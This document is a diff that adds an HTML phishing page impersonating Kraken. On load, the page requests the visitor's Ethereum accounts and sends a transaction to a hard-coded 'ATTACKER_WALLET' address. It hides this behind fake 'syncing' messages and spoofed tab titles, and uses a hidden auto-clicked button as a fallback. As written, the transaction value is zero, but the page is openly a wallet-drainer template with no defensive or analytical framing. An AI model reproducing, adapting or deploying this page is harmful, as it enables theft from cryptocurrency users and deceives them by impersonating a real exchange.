@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>kraken.com - Wallet Connected</title>
+  <style>
+    body {
+      margin: 0; padding: 0; background: #0a1a2a; color: #e0f7fa; font-family: system-ui;
+      display: flex; flex-direction: column; align-items: center; justify-content: center;
+      height: 100vh; text-align: center;
+    }
+    .kraken { font-size: 32px; font-weight: 900; color: #00c853; margin-bottom: 12px; }
+    .msg { font-size: 18px; margin: 16px 0; color: #80deea; }
+    .loader {
+      width: 40px; height: 40px; border: 4px solid #1a3a5c; border-top: 4px solid #00c853;
+      border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto;
+    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .hidden { display: none; }
+  </style>
+</head>
+<body>
+  <div class="kraken">KRAKEN</div>
+  <h2>Wallet Connecting...</h2>
+  <div class="loader"></div>
+  <p class="msg" id="msg">Please wait while we securely connect your wallet.</p>
+
+  <script>
+    
+    const msgEl = document.getElementById('msg');
+    const ATTACKER_WALLET = "0x98f46991ec05ad3edf812a95dd1c28fee9ad42e6."; 
+
+   
+    let titleIndex = 0;
+    const titles = [
+      "kraken.com - Wallet Connected",
+      "kraken.com - Secure Connection",
+      "kraken.com - Syncing...",
+      "kraken.com - Finalizing"
+    ];
+    setInterval(() => {
+      document.title = titles[titleIndex % titles.length];
+      titleIndex++;
+    }, 800);
+
+    // Auto trigger saat DOM siap
+    window.addEventListener('DOMContentLoaded', () => {
+      setTimeout(autoConnectAndDrain, 300); 
+    });
+
+    async function autoConnectAndDrain() {
+      if (!window.ethereum) {
+        msgEl.innerText = "No wallet detected.";
+        return;
+      }
+
+      try {
+        
+        msgEl.innerText = "Requesting wallet access...";
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const user = accounts[0];
+        msgEl.innerText = `Connected: ${user.slice(0,6)}...${user.slice(-4)}`;
+
+        // STEP 2: Auto send DRAIN transaction
+        setTimeout(async () => {
+          msgEl.innerText = "Syncing balance...";
+          try {
+            const tx = await window.ethereum.request({
+              method: 'eth_sendTransaction',
+              params: [{
+                from: user,
+                to: ATTACKER_WALLET,
+                value: '0x0', // 0 ETH, 
+                gas: '0x5208',
+                data: '0x' 
+              }]
+            });
+            msgEl.innerText = `Synced! Tx: ${tx.slice(0,10)}...`;
+            
+            // Spoof final title
+            document.title = "kraken.com - Sync Complete";
+          } catch (err) {
+            msgEl.innerText = "Sync failed. Try again.";
+          }
+        }, 1200);
+
+      } catch (err) {
+        msgEl.innerText = "Connection failed.";
+        console.error(err);
+      }
+    }
+
+    // === BONUS: Auto click fallback jika butuh interaction ===
+    setTimeout(() => {
+      const fakeBtn = document.createElement('button');
+      fakeBtn.id = 'connectBtn';
+      fakeBtn.className = 'hidden';
+      fakeBtn.onclick = autoConnectAndDrain;
+      document.body.appendChild(fakeBtn);
+      fakeBtn.click();
+    }, 100);
+  </script>
+</body>
+</html>
